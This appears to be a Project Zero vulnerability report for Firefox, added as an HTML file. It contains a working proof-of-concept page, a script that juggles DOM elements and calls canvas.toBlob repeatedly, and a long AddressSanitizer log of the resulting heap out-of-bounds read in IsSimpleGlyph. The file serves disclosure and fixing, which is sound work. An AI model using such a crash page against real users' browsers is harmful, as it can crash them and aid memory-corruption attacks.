@@ -1,0 +1,207 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1160
+
+Mozilla bug tracker link: https://bugzilla.mozilla.org/show_bug.cgi?id=1343552
+
+There is an out-of-bounds read vulnerability in Firefox. The vulnerability was confirmed on the nightly ASan build. 
+
+PoC:
+
+=================================================================
+-->
+
+<style>
+.class1 { float: left; white-space: pre-line; }
+.class2 { border-bottom-style: solid; font-face: Arial; font-size: 7ex; }
+</style>
+<script>
+function go() {
+  menuitem.appendChild(document.body.firstChild);
+  canvas.toBlob(callback);
+}
+function callback() {
+  var s = menu.style;
+  s.setProperty("flex-direction", "row-reverse");
+  option.scrollBy();
+  document.implementation.createHTMLDocument("foo").adoptNode(progress);
+  s.setProperty("flex-direction", "column");
+  canvas.toBlob(callback);
+}
+</script>
+aaaaaaaaaaaaaaaaaa
+</head>
+<body onload=go()>
+<del class="class1">
+<span class="class2">
+<menu id="menu">
+<menuitem>
+</menu>
+<menuitem id="menuitem">
+<progress id="progress">
+</del>
+<ol dir="rtl">l+0</ol>
+<canvas id="canvas">
+<option id="option">
+
+<!--
+=================================================================
+
+ASan log:
+
+=================================================================
+==104545==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x611000721ecc at pc 0x7fcef25af0e8 bp 0x7ffc23afd1b0 sp 0x7ffc23afd1a8
+READ of size 4 at 0x611000721ecc thread T0
+    #0 0x7fcef25af0e7 in IsSimpleGlyph /home/worker/workspace/build/src/gfx/thebes/gfxFont.h:785:46
+    #1 0x7fcef25af0e7 in GetAdvanceForGlyph /home/worker/workspace/build/src/gfx/thebes/gfxTextRun.h:638
+    #2 0x7fcef25af0e7 in GetAdvanceForGlyphs /home/worker/workspace/build/src/gfx/thebes/gfxTextRun.cpp:334
+    #3 0x7fcef25af0e7 in gfxTextRun::GetAdvanceWidth(gfxTextRun::Range, gfxTextRun::PropertyProvider*, gfxFont::Spacing*) const /home/worker/workspace/build/src/gfx/thebes/gfxTextRun.cpp:1074
+    #4 0x7fcef704ac7c in nsTextFrame::TrimTrailingWhiteSpace(mozilla::gfx::DrawTarget*) /home/worker/workspace/build/src/layout/generic/nsTextFrame.cpp:9654:15
+    #5 0x7fcef6d2a2ef in nsLineLayout::TrimTrailingWhiteSpaceIn(nsLineLayout::PerSpanData*, int*) /home/worker/workspace/build/src/layout/generic/nsLineLayout.cpp:2584:44
+    #6 0x7fcef6d2a1c7 in nsLineLayout::TrimTrailingWhiteSpaceIn(nsLineLayout::PerSpanData*, int*) /home/worker/workspace/build/src/layout/generic/nsLineLayout.cpp:2531:11
+    #7 0x7fcef6d2a1c7 in nsLineLayout::TrimTrailingWhiteSpaceIn(nsLineLayout::PerSpanData*, int*) /home/worker/workspace/build/src/layout/generic/nsLineLayout.cpp:2531:11
+    #8 0x7fcef6d2b293 in nsLineLayout::TrimTrailingWhiteSpace() /home/worker/workspace/build/src/layout/generic/nsLineLayout.cpp:2654:3
+    #9 0x7fcef6dcc03b in nsBlockFrame::PlaceLine(mozilla::BlockReflowInput&, nsLineLayout&, nsLineList_iterator, nsFloatManager::SavedState*, mozilla::LogicalRect&, int&, bool*) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:4479:3
+    #10 0x7fcef6dcabe3 in nsBlockFrame::DoReflowInlineFrames(mozilla::BlockReflowInput&, nsLineLayout&, nsLineList_iterator, nsFlowAreaRect&, int&, nsFloatManager::SavedState*, bool*, LineReflowStatus*, bool) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:4082:12
+    #11 0x7fcef6dc0d6c in nsBlockFrame::ReflowInlineFrames(mozilla::BlockReflowInput&, nsLineList_iterator, bool*) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:3828:9
+    #12 0x7fcef6dafacf in ReflowLine /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:2834:5
+    #13 0x7fcef6dafacf in nsBlockFrame::ReflowDirtyLines(mozilla::BlockReflowInput&) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:2370
+    #14 0x7fcef6da5c1a in nsBlockFrame::Reflow(nsPresContext*, mozilla::ReflowOutput&, mozilla::ReflowInput const&, nsReflowStatus&) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:1237:3
+    #15 0x7fcef6dc6e8d in nsBlockReflowContext::ReflowBlock(mozilla::LogicalRect const&, bool, nsCollapsingMargin&, int, bool, nsLineBox*, mozilla::ReflowInput&, nsReflowStatus&, mozilla::BlockReflowInput&) /home/worker/workspace/build/src/layout/generic/nsBlockReflowContext.cpp:306:3
+    #16 0x7fcef6dd9001 in nsBlockFrame::ReflowFloat(mozilla::BlockReflowInput&, mozilla::LogicalRect const&, nsIFrame*, mozilla::LogicalMargin&, mozilla::LogicalMargin&, bool, nsReflowStatus&) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:6272:5
+    #17 0x7fcef6d4d19f in mozilla::BlockReflowInput::FlowAndPlaceFloat(nsIFrame*) /home/worker/workspace/build/src/layout/generic/BlockReflowInput.cpp:910:5
+    #18 0x7fcef6d4b143 in mozilla::BlockReflowInput::AddFloat(nsLineLayout*, nsIFrame*, int) /home/worker/workspace/build/src/layout/generic/BlockReflowInput.cpp:627:14
+    #19 0x7fcef6d21369 in AddFloat /home/worker/workspace/build/src/layout/generic/nsLineLayout.h:190:12
+    #20 0x7fcef6d21369 in nsLineLayout::ReflowFrame(nsIFrame*, nsReflowStatus&, mozilla::ReflowOutput*, bool&) /home/worker/workspace/build/src/layout/generic/nsLineLayout.cpp:979
+    #21 0x7fcef6dcb7bb in nsBlockFrame::ReflowInlineFrame(mozilla::BlockReflowInput&, nsLineLayout&, nsLineList_iterator, nsIFrame*, LineReflowStatus*) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:4153:3
+    #22 0x7fcef6dca446 in nsBlockFrame::DoReflowInlineFrames(mozilla::BlockReflowInput&, nsLineLayout&, nsLineList_iterator, nsFlowAreaRect&, int&, nsFloatManager::SavedState*, bool*, LineReflowStatus*, bool) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:3954:5
+    #23 0x7fcef6dc0d6c in nsBlockFrame::ReflowInlineFrames(mozilla::BlockReflowInput&, nsLineList_iterator, bool*) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:3828:9
+    #24 0x7fcef6dafacf in ReflowLine /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:2834:5
+    #25 0x7fcef6dafacf in nsBlockFrame::ReflowDirtyLines(mozilla::BlockReflowInput&) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:2370
+    #26 0x7fcef6da5c1a in nsBlockFrame::Reflow(nsPresContext*, mozilla::ReflowOutput&, mozilla::ReflowInput const&, nsReflowStatus&) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:1237:3
+    #27 0x7fcef6dc6e8d in nsBlockReflowContext::ReflowBlock(mozilla::LogicalRect const&, bool, nsCollapsingMargin&, int, bool, nsLineBox*, mozilla::ReflowInput&, nsReflowStatus&, mozilla::BlockReflowInput&) /home/worker/workspace/build/src/layout/generic/nsBlockReflowContext.cpp:306:3
+    #28 0x7fcef6dbc4da in nsBlockFrame::ReflowBlockFrame(mozilla::BlockReflowInput&, nsLineList_iterator, bool*) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:3462:7
+    #29 0x7fcef6dafafa in ReflowLine /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:2831:5
+    #30 0x7fcef6dafafa in nsBlockFrame::ReflowDirtyLines(mozilla::BlockReflowInput&) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:2370
+    #31 0x7fcef6da5c1a in nsBlockFrame::Reflow(nsPresContext*, mozilla::ReflowOutput&, mozilla::ReflowInput const&, nsReflowStatus&) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:1237:3
+    #32 0x7fcef6e0ada0 in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, mozilla::ReflowOutput&, mozilla::ReflowInput const&, mozilla::WritingMode const&, mozilla::LogicalPoint const&, nsSize const&, unsigned int, nsReflowStatus&, nsOverflowContinuationTracker*) /home/worker/workspace/build/src/layout/generic/nsContainerFrame.cpp:1028:3
+    #33 0x7fcef6e09555 in nsCanvasFrame::Reflow(nsPresContext*, mozilla::ReflowOutput&, mozilla::ReflowInput const&, nsReflowStatus&) /home/worker/workspace/build/src/layout/generic/nsCanvasFrame.cpp:711:5
+    #34 0x7fcef6e0ada0 in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, mozilla::ReflowOutput&, mozilla::ReflowInput const&, mozilla::WritingMode const&, mozilla::LogicalPoint const&, nsSize const&, unsigned int, nsReflowStatus&, nsOverflowContinuationTracker*) /home/worker/workspace/build/src/layout/generic/nsContainerFrame.cpp:1028:3
+    #35 0x7fcef6eb0394 in nsHTMLScrollFrame::ReflowScrolledFrame(mozilla::ScrollReflowInput*, bool, bool, mozilla::ReflowOutput*, bool) /home/worker/workspace/build/src/layout/generic/nsGfxScrollFrame.cpp:552:3
+    #36 0x7fcef6eb1840 in nsHTMLScrollFrame::ReflowContents(mozilla::ScrollReflowInput*, mozilla::ReflowOutput const&) /home/worker/workspace/build/src/layout/generic/nsGfxScrollFrame.cpp:664:3
+    #37 0x7fcef6eb5073 in nsHTMLScrollFrame::Reflow(nsPresContext*, mozilla::ReflowOutput&, mozilla::ReflowInput const&, nsReflowStatus&) /home/worker/workspace/build/src/layout/generic/nsGfxScrollFrame.cpp:1039:3
+    #38 0x7fcef6e1b964 in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, mozilla::ReflowOutput&, mozilla::ReflowInput const&, int, int, unsigned int, nsReflowStatus&, nsOverflowContinuationTracker*) /home/worker/workspace/build/src/layout/generic/nsContainerFrame.cpp:1072:3
+    #39 0x7fcef6d8b760 in mozilla::ViewportFrame::Reflow(nsPresContext*, mozilla::ReflowOutput&, mozilla::ReflowInput const&, nsReflowStatus&) /home/worker/workspace/build/src/layout/generic/ViewportFrame.cpp:326:7
+    #40 0x7fcef6b89187 in mozilla::PresShell::DoReflow(nsIFrame*, bool) /home/worker/workspace/build/src/layout/base/PresShell.cpp:9202:3
+    #41 0x7fcef6b9cde4 in mozilla::PresShell::ProcessReflowCommands(bool) /home/worker/workspace/build/src/layout/base/PresShell.cpp:9375:24
+    #42 0x7fcef6b9bcf6 in mozilla::PresShell::DoFlushPendingNotifications(mozilla::ChangesToFlush) /home/worker/workspace/build/src/layout/base/PresShell.cpp:4174:11
+    #43 0x7fcef2c4646e in FlushPendingNotifications /home/worker/workspace/build/src/obj-firefox/dist/include/nsIPresShell.h:598:5
+    #44 0x7fcef2c4646e in nsDocument::FlushPendingNotifications(mozilla::FlushType) /home/worker/workspace/build/src/dom/base/nsDocument.cpp:7961
+    #45 0x7fcef2a1f2b4 in GetPrimaryFrame /home/worker/workspace/build/src/dom/base/Element.cpp:2164:5
+    #46 0x7fcef2a1f2b4 in mozilla::dom::Element::GetScrollFrame(nsIFrame**, bool) /home/worker/workspace/build/src/dom/base/Element.cpp:637
+    #47 0x7fcef2a20871 in mozilla::dom::Element::ScrollBy(mozilla::dom::ScrollToOptions const&) /home/worker/workspace/build/src/dom/base/Element.cpp:794:28
+    #48 0x7fcef4112002 in mozilla::dom::ElementBinding::scrollBy(JSContext*, JS::Handle<JSObject*>, mozilla::dom::Element*, JSJitMethodCallArgs const&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/ElementBinding.cpp:2492:7
+    #49 0x7fcef45cdd27 in mozilla::dom::GenericBindingMethod(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:2953:13
+    #50 0x7fcefa0cc04f in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:282:15
+    #51 0x7fcefa0cc04f in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:448
+    #52 0x7fcefa0b2970 in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:499:12
+    #53 0x7fcefa0b2970 in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2955
+    #54 0x7fcefa097c9b in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:394:12
+    #55 0x7fcefa0cc366 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:466:15
+    #56 0x7fcefa0cca42 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:512:10
+    #57 0x7fcefaa9cd1c in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2878:12
+    #58 0x7fcef4242c05 in mozilla::dom::BlobCallback::Call(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Blob*, mozilla::ErrorResult&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/HTMLCanvasElementBinding.cpp:81:8
+    #59 0x7fcef475613f in Call /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/HTMLCanvasElementBinding.h:180:12
+    #60 0x7fcef475613f in mozilla::dom::CanvasRenderingContextHelper::ToBlob(JSContext*, nsIGlobalObject*, mozilla::dom::BlobCallback&, nsAString_internal const&, JS::Handle<JS::Value>, mozilla::ErrorResult&)::EncodeCallback::ReceiveBlob(already_AddRefed<mozilla::dom::Blob>) /home/worker/workspace/build/src/dom/canvas/CanvasRenderingContextHelper.cpp:56
+    #61 0x7fcef2acde86 in mozilla::dom::EncodingCompleteEvent::Run() /home/worker/workspace/build/src/dom/base/ImageEncoder.cpp:105:12
+    #62 0x7fcef0217012 in nsThread::ProcessNextEvent(bool, bool*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1264:7
+    #63 0x7fcef02138c0 in NS_ProcessNextEvent(nsIThread*, bool) /home/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:389:10
+    #64 0x7fcef10322bf in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /home/worker/workspace/build/src/ipc/glue/MessagePump.cpp:96:21
+    #65 0x7fcef0fa3658 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:238:3
+    #66 0x7fcef0fa3658 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:231
+    #67 0x7fcef0fa3658 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:211
+    #68 0x7fcef63ffdbf in nsBaseAppShell::Run() /home/worker/workspace/build/src/widget/nsBaseAppShell.cpp:156:3
+    #69 0x7fcef9a88d81 in nsAppStartup::Run() /home/worker/workspace/build/src/toolkit/components/startup/nsAppStartup.cpp:283:19
+    #70 0x7fcef9c5243c in XREMain::XRE_mainRun() /home/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4476:10
+    #71 0x7fcef9c53f38 in XREMain::XRE_main(int, char**, mozilla::BootstrapConfig const&) /home/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4654:8
+    #72 0x7fcef9c551fc in XRE_main(int, char**, mozilla::BootstrapConfig const&) /home/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4745:16
+    #73 0x4dffaf in do_main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:237:10
+    #74 0x4dffaf in main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:308
+    #75 0x7fcf0b63282f in __libc_start_main /build/glibc-t3gR2i/glibc-2.23/csu/../csu/libc-start.c:291
+    #76 0x41c3d8 in _start (/home/ifratric/p0/latest/firefox/firefox+0x41c3d8)
+
+0x611000721ecc is located 0 bytes to the right of 204-byte region [0x611000721e00,0x611000721ecc)
+allocated by thread T0 here:
+    #0 0x4b2e4b in malloc /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:52:3
+    #1 0x7fcef25b9900 in AllocateStorageForTextRun /home/worker/workspace/build/src/gfx/thebes/gfxTextRun.cpp:122:21
+    #2 0x7fcef25b9900 in Create /home/worker/workspace/build/src/gfx/thebes/gfxTextRun.cpp:139
+    #3 0x7fcef25b9900 in gfxFontGroup::MakeTextRun(unsigned char const*, unsigned int, gfxTextRunFactory::Parameters const*, unsigned int, gfxMissingFontRecorder*) /home/worker/workspace/build/src/gfx/thebes/gfxTextRun.cpp:2075
+    #4 0x7fcef6ff6f49 in BuildTextRunsScanner::BuildTextRunForFrames(void*) /home/worker/workspace/build/src/layout/generic/nsTextFrame.cpp:2394:17
+    #5 0x7fcef6fefe0b in BuildTextRunsScanner::FlushFrames(bool, bool) /home/worker/workspace/build/src/layout/generic/nsTextFrame.cpp:1633:17
+    #6 0x7fcef6ffb09d in BuildTextRunsScanner::ScanFrame(nsIFrame*) /home/worker/workspace/build/src/layout/generic/nsTextFrame.cpp:1902:9
+    #7 0x7fcef6ffb72f in BuildTextRunsScanner::ScanFrame(nsIFrame*) /home/worker/workspace/build/src/layout/generic/nsTextFrame.cpp:1942:5
+    #8 0x7fcef6ffb72f in BuildTextRunsScanner::ScanFrame(nsIFrame*) /home/worker/workspace/build/src/layout/generic/nsTextFrame.cpp:1942:5
+    #9 0x7fcef7003a8a in BuildTextRuns /home/worker/workspace/build/src/layout/generic/nsTextFrame.cpp:1534:7
+    #10 0x7fcef7003a8a in nsTextFrame::EnsureTextRun(nsTextFrame::TextRunType, mozilla::gfx::DrawTarget*, nsIFrame*, nsLineList_iterator const*, unsigned int*) /home/worker/workspace/build/src/layout/generic/nsTextFrame.cpp:2860
+    #11 0x7fcef703d429 in nsTextFrame::AddInlineMinISizeForFlow(nsRenderingContext*, nsIFrame::InlineMinISizeData*, nsTextFrame::TextRunType) /home/worker/workspace/build/src/layout/generic/nsTextFrame.cpp:8329:5
+    #12 0x7fcef70405ef in nsTextFrame::AddInlineMinISize(nsRenderingContext*, nsIFrame::InlineMinISizeData*) /home/worker/workspace/build/src/layout/generic/nsTextFrame.cpp:8499:7
+    #13 0x7fcef6e1a982 in nsContainerFrame::DoInlineIntrinsicISize(nsRenderingContext*, nsIFrame::InlineIntrinsicISizeData*, nsLayoutUtils::IntrinsicISizeType) /home/worker/workspace/build/src/layout/generic/nsContainerFrame.cpp:897:9
+    #14 0x7fcef6e1a982 in nsContainerFrame::DoInlineIntrinsicISize(nsRenderingContext*, nsIFrame::InlineIntrinsicISizeData*, nsLayoutUtils::IntrinsicISizeType) /home/worker/workspace/build/src/layout/generic/nsContainerFrame.cpp:897:9
+    #15 0x7fcef6d9f622 in nsBlockFrame::GetMinISize(nsRenderingContext*) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:774:11
+    #16 0x7fcef6e1b150 in ShrinkWidthToFit /home/worker/workspace/build/src/layout/generic/nsFrame.cpp:5566:22
+    #17 0x7fcef6e1b150 in nsContainerFrame::ComputeAutoSize(nsRenderingContext*, mozilla::WritingMode, mozilla::LogicalSize const&, int, mozilla::LogicalSize const&, mozilla::LogicalSize const&, mozilla::LogicalSize const&, nsIFrame::ComputeSizeFlags) /home/worker/workspace/build/src/layout/generic/nsContainerFrame.cpp:942
+    #18 0x7fcef6e2260e in nsFrame::ComputeSize(nsRenderingContext*, mozilla::WritingMode, mozilla::LogicalSize const&, int, mozilla::LogicalSize const&, mozilla::LogicalSize const&, mozilla::LogicalSize const&, nsIFrame::ComputeSizeFlags) /home/worker/workspace/build/src/layout/generic/nsFrame.cpp:4822:24
+    #19 0x7fcef6d4fb36 in FloatMarginISize(mozilla::ReflowInput const&, int, nsIFrame*, mozilla::SizeComputationInput const&) /home/worker/workspace/build/src/layout/generic/BlockReflowInput.cpp:692:5
+    #20 0x7fcef6d4c21f in mozilla::BlockReflowInput::FlowAndPlaceFloat(nsIFrame*) /home/worker/workspace/build/src/layout/generic/BlockReflowInput.cpp:757:30
+    #21 0x7fcef6d4b143 in mozilla::BlockReflowInput::AddFloat(nsLineLayout*, nsIFrame*, int) /home/worker/workspace/build/src/layout/generic/BlockReflowInput.cpp:627:14
+    #22 0x7fcef6d21369 in AddFloat /home/worker/workspace/build/src/layout/generic/nsLineLayout.h:190:12
+    #23 0x7fcef6d21369 in nsLineLayout::ReflowFrame(nsIFrame*, nsReflowStatus&, mozilla::ReflowOutput*, bool&) /home/worker/workspace/build/src/layout/generic/nsLineLayout.cpp:979
+    #24 0x7fcef6dcb7bb in nsBlockFrame::ReflowInlineFrame(mozilla::BlockReflowInput&, nsLineLayout&, nsLineList_iterator, nsIFrame*, LineReflowStatus*) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:4153:3
+    #25 0x7fcef6dca446 in nsBlockFrame::DoReflowInlineFrames(mozilla::BlockReflowInput&, nsLineLayout&, nsLineList_iterator, nsFlowAreaRect&, int&, nsFloatManager::SavedState*, bool*, LineReflowStatus*, bool) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:3954:5
+    #26 0x7fcef6dc0d6c in nsBlockFrame::ReflowInlineFrames(mozilla::BlockReflowInput&, nsLineList_iterator, bool*) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:3828:9
+    #27 0x7fcef6dafacf in ReflowLine /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:2834:5
+    #28 0x7fcef6dafacf in nsBlockFrame::ReflowDirtyLines(mozilla::BlockReflowInput&) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:2370
+    #29 0x7fcef6da5c1a in nsBlockFrame::Reflow(nsPresContext*, mozilla::ReflowOutput&, mozilla::ReflowInput const&, nsReflowStatus&) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:1237:3
+    #30 0x7fcef6dc6e8d in nsBlockReflowContext::ReflowBlock(mozilla::LogicalRect const&, bool, nsCollapsingMargin&, int, bool, nsLineBox*, mozilla::ReflowInput&, nsReflowStatus&, mozilla::BlockReflowInput&) /home/worker/workspace/build/src/layout/generic/nsBlockReflowContext.cpp:306:3
+    #31 0x7fcef6dbc4da in nsBlockFrame::ReflowBlockFrame(mozilla::BlockReflowInput&, nsLineList_iterator, bool*) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:3462:7
+    #32 0x7fcef6dafafa in ReflowLine /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:2831:5
+    #33 0x7fcef6dafafa in nsBlockFrame::ReflowDirtyLines(mozilla::BlockReflowInput&) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:2370
+    #34 0x7fcef6da5c1a in nsBlockFrame::Reflow(nsPresContext*, mozilla::ReflowOutput&, mozilla::ReflowInput const&, nsReflowStatus&) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:1237:3
+    #35 0x7fcef6e0ada0 in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, mozilla::ReflowOutput&, mozilla::ReflowInput const&, mozilla::WritingMode const&, mozilla::LogicalPoint const&, nsSize const&, unsigned int, nsReflowStatus&, nsOverflowContinuationTracker*) /home/worker/workspace/build/src/layout/generic/nsContainerFrame.cpp:1028:3
+    #36 0x7fcef6e09555 in nsCanvasFrame::Reflow(nsPresContext*, mozilla::ReflowOutput&, mozilla::ReflowInput const&, nsReflowStatus&) /home/worker/workspace/build/src/layout/generic/nsCanvasFrame.cpp:711:5
+
+SUMMARY: AddressSanitizer: heap-buffer-overflow /home/worker/workspace/build/src/gfx/thebes/gfxFont.h:785:46 in IsSimpleGlyph
+Shadow bytes around the buggy address:
+  0x0c22800dc380: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0c22800dc390: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd
+  0x0c22800dc3a0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
+  0x0c22800dc3b0: fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa
+  0x0c22800dc3c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+=>0x0c22800dc3d0: 00 00 00 00 00 00 00 00 00[04]fa fa fa fa fa fa
+  0x0c22800dc3e0: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd
+  0x0c22800dc3f0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
+  0x0c22800dc400: fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa
+  0x0c22800dc410: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0c22800dc420: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fa
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07 
+  Heap left redzone:       fa
+  Heap right redzone:      fb
+  Freed heap region:       fd
+  Stack left redzone:      f1
+  Stack mid redzone:       f2
+  Stack right redzone:     f3
+  Stack partial redzone:   f4
+  Stack after return:      f5
+  Stack use after scope:   f8
+  Global redzone:          f9
+  Global init order:       f6
+  Poisoned by user:        f7
+  Container overflow:      fc
+  Array cookie:            ac
+  Intra object redzone:    bb
+  ASan internal:           fe
+  Left alloca redzone:     ca
+  Right alloca redzone:    cb
+==104545==ABORTING
+-->
